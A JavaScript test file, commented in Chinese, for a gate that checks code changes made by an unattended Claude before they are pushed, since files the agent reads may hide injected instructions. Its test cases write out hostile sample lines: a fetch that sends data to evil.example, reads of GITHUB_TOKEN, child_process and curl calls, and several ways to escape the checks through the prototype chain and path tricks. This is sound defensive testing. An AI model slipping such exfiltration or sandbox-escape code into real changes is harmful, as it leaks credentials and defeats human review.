/**
 * 自動修正推上去之前的固定檢查。施工日誌與承辦人說明都會被無人看管的 Claude 讀,
 * 若有人藏了指令,這裡是最後一道:不在範圍內的檔案、能碰系統/網路的寫法一律擋下。
 * 用真的 git 建暫存 repo,模擬 Claude 的 commit。
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');
const { check } = require('../scripts/fix-queue-gate');

const PARSER = 'app/server/parsers/vendors/samples/jiumu.pmisparser.js';
let dir;
let base;
const git = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
const write = (rel, text) => {
  fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
  fs.writeFileSync(path.join(dir, rel), text);
};
const commit = () => { git('add', '-A'); git('commit', '-qm', 'claude'); };

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pmis-gate-'));
  git('init', '-q');
  git('config', 'user.email', 't@t'); git('config', 'user.name', 't');
  write(PARSER, 'const x = 395;\n');
  write('app/server/daily-log-routes.js', '// routes\n');
  commit();
  base = git('rev-parse', 'HEAD');
});
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

test('fixtures 裡放可執行的檔案(.js/.cjs/.node)→ 擋下', () => {
  write('app/tests/fixtures/evil.cjs', 'x');
  write('app/tests/fixtures/evil.node', 'x');
  commit();
  const p = check(dir, base).join('\n');
  expect(p).toContain('evil.cjs');
  expect(p).toContain('evil.node');
});

test('只改讀取器與測試、沒有危險寫法 → 通過', () => {
  write(PARSER, 'const x = cumulativeQtyHeader ? cumulativeQtyHeader.x : 395;\nwhile ((m = re.exec(s))) n++;\n');
  write('app/tests/parser-jiumu.test.js', "const path = require('path');\nprocess.env.PMIS_DATA_DIR = 'x';\n");
  write('app/tests/fixtures/jiumu-new.pdf', '%PDF');
  commit();
  expect(check(dir, base)).toEqual([]);
});

test('改到範圍外的檔案(上傳流程、workflow、套件清單)→ 擋下', () => {
  write('app/server/daily-log-routes.js', '// changed\n');
  write('.github/workflows/x.yml', 'on: push');
  write('app/package.json', '{}');
  commit();
  const p = check(dir, base);
  expect(p).toEqual(expect.arrayContaining([
    expect.stringContaining('app/server/daily-log-routes.js'),
    expect.stringContaining('.github/workflows/x.yml'),
    expect.stringContaining('app/package.json'),
  ]));
});

test.each([
  ["const cp = require('child_process');", '「require」'],
  ["fetch('https://evil.example/' + data);", '「fetch」'],
  ['const k = process.env.GITHUB_TOKEN;', '「process」'],
  ["new Function('return 1')();", '「Function」'],
  ['globalThis.x = 1;', '「globalThis」'],
  // 逐行比對時代的漏洞:看起來像註解開頭就整行跳過
  ["/* 註解 */ require('child_process');", '「require」'],
  // 原型鏈逃脫:不用任何危險識別字也能拿到 Function
  ["const f = ''.constructor.constructor;", '「.constructor」'],
  ["const f = x['con' + 'structor'];", '拼湊的字串'],
  ["const f = x['constructor'];", '字串含'],
  ['const c = String.fromCharCode(99);', '「.fromCharCode」'],
  ["const s = `${a}`; module.require('fs');", '「module」'],
])('讀取器新增 %s → 擋下(%s)', (line, label) => {
  write(PARSER, `const x = 395;\n${line}\n`);
  commit();
  expect(check(dir, base).join('\n')).toContain(label);
});

test('測試檔也不准連網或執行外部程式', () => {
  write('app/tests/parser-jiumu.test.js', "require('child_process').execSync('curl x');\n");
  commit();
  expect(check(dir, base).length).toBeGreaterThan(0);
});

test('既有程式本來就有的寫法不算,同一類變多才擋', () => {
  write(PARSER, "const XLSX = require('xlsx');\n");
  commit();
  base = git('rev-parse', 'HEAD');
  write(PARSER, "const XLSX = require('xlsx');\nconst n = 1;\n");
  commit();
  expect(check(dir, base)).toEqual([]);
  write(PARSER, "const XLSX = require('xlsx');\nconst n = 1;\nconst cp = require('child_process');\n");
  commit();
  expect(check(dir, base).join('\n')).toContain('「require」');
});

// 只比數量會被「刪一個合理的、加一個危險的」抵銷
test('把既有的 require 換成危險的那個 → 擋下(數量沒變也一樣)', () => {
  write(PARSER, "const XLSX = require('xlsx');\n");
  commit();
  base = git('rev-parse', 'HEAD');
  write(PARSER, "const cp = require('child_process');\n");
  commit();
  expect(check(dir, base).join('\n')).toContain("require('child_process')");
});

test.each([
  ['const r = require; r("child_process");', '轉存'],
  ["require.call(null, './x');", '轉存'],
  ["module.constructor._load('child_process');", 'module'],
  ['process.mainModule.require("x");', '.mainModule'],
  ["const name = 'child_process';", '系統模組名'],
  // fixtures 什麼副檔名都收,gate 卻只解析 .js
  ["require('./fixtures/evil.cjs');", '檢查不到的檔案'],
  ["require('../tests/fixtures/x.js');", '檢查不到的檔案'],
  // 正規化之前比對會被這些寫法繞過
  ["require('./Fixtures/x');", '檢查不到的檔案'],
  ["require('./tests/./fixtures/x.js');", '檢查不到的檔案'],
  // 反斜線路徑不是一般的 ./ 相對路徑,在前一條「不在允許清單的模組」就擋下
  ["require('.\\\\fixtures\\\\x');", 'require 了'],
])('測試檔新增 %s → 擋下(%s)', (line, label) => {
  write('app/tests/parser-jiumu.test.js', `${line}\n`);
  commit();
  expect(check(dir, base).join('\n')).toContain(label);
});

// 已經載入 child_process 的測試,改它時用既有的 execFileSync 就不必新增 require
test('修改前就載入系統模組的測試不准自動修改', () => {
  write('app/tests/git-auth.test.js', "const { execFileSync } = require('child_process');\n");
  commit();
  base = git('rev-parse', 'HEAD');
  write('app/tests/git-auth.test.js', "const { execFileSync } = require('child_process');\nexecFileSync('curl', ['x']);\n");
  commit();
  expect(check(dir, base).join('\n')).toContain('只准人工修改');
});

test("讀取器用字串存取危險屬性 x['mainModule'] → 擋下", () => {
  write(PARSER, "const x = 395;\nconst m = y['mainModule'];\n");
  commit();
  expect(check(dir, base).join('\n')).toContain("['mainModule']");
});

test('解析不了的檔案直接拒絕', () => {
  write(PARSER, 'const x = ;\n');
  commit();
  expect(check(dir, base).join('\n')).toContain('無法解析');
});

test('註解裡提到 require 不算', () => {
  write(PARSER, "const x = 395;\n// 讀取器絕不 require 任何東西\n");
  commit();
  expect(check(dir, base)).toEqual([]);
});

test('Claude 什麼都沒改 → 不算修好', () => {
  expect(check(dir, base)).toEqual(['沒有任何改動']);
});
